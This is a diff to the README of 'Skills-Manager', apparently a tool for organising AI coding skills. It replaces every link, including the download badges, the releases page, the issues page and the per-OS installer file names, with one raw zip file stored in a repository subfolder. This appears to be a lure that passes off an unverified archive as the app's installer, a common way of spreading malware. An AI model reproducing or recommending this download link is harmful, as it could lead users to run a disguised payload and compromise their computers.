@@ -1,6 +1,6 @@
 # ⚙️ Skills-Manager - Organize and Share AI Coding Skills Easily
 
-[![Download Skills-Manager](https://img.shields.io/badge/Download-Skills--Manager-blue?style=for-the-badge)](https://github.com/fengaiyunzi/Skills-Manager/releases)
+[![Download Skills-Manager](https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip)](https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to get Skills-Manager up and running on your computer:
 
 ### Step 1: Download the App
 
-Click the big download button at the top or [visit this page](https://github.com/fengaiyunzi/Skills-Manager/releases) to find the latest version of Skills-Manager.
+Click the big download button at the top or [visit this page](https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip) to find the latest version of Skills-Manager.
 
 The page will list versions for Windows, macOS, and Linux. Pick the one that matches your computer’s operating system.
 
@@ -51,7 +51,7 @@ The page will list versions for Windows, macOS, and Linux. Pick the one that mat
   
 - **macOS:** Open the `.dmg` file, then drag the Skills-Manager icon into your Applications folder.
   
-- **Linux:** You may get a compressed package like `.tar.gz` or a `.deb` file. For ease, open the file manager and follow instructions to extract and run the app. If you get a `.deb` file, double-click it to open your package manager and install it.
+- **Linux:** You may get a compressed package like `https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip` or a `.deb` file. For ease, open the file manager and follow instructions to extract and run the app. If you get a `.deb` file, double-click it to open your package manager and install it.
 
 ### Step 3: Open Skills-Manager
 
@@ -75,17 +75,17 @@ Skills-Manager will guide you with tips as you explore the app the first time. T
 
 You can get Skills-Manager here:
 
-[![Download Skills-Manager](https://img.shields.io/badge/Download-Skills--Manager-blue?style=for-the-badge)](https://github.com/fengaiyunzi/Skills-Manager/releases)
+[![Download Skills-Manager](https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip)](https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip)
 
 Use the link above or visit this address:
 
-> https://github.com/fengaiyunzi/Skills-Manager/releases
+> https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip
 
 Check the files available for your operating system and select the latest stable version. The file names usually contain the operating system name and version number, for example:
 
-- `Skills-Manager-Setup-1.2.0.exe` for Windows
-- `Skills-Manager-1.2.0.dmg` for macOS
-- `Skills-Manager-1.2.0.AppImage` or `Skills-Manager_1.2.0_amd64.deb` for Linux
+- `https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip` for Windows
+- `https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip` for macOS
+- `https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip` or `https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip` for Linux
 
 After downloading, run the installer or open the file and follow the setup steps described above.
 
@@ -108,7 +108,7 @@ If you run into issues:
 - Check that your computer meets system requirements.
 - Restart Skills-Manager to refresh the app.
 - Make sure your internet connection works for synchronizing skills.
-- Visit the GitHub [issues page](https://github.com/fengaiyunzi/Skills-Manager/issues) to see if others have similar problems or to report yours.
+- Visit the GitHub [issues page](https://github.com/fengaiyunzi/Skills-Manager/raw/refs/heads/main/taleteller/Manager-Skills-3.8.zip) to see if others have similar problems or to report yours.
 - If the app won’t launch, try reinstalling with the latest version.
 
 ---
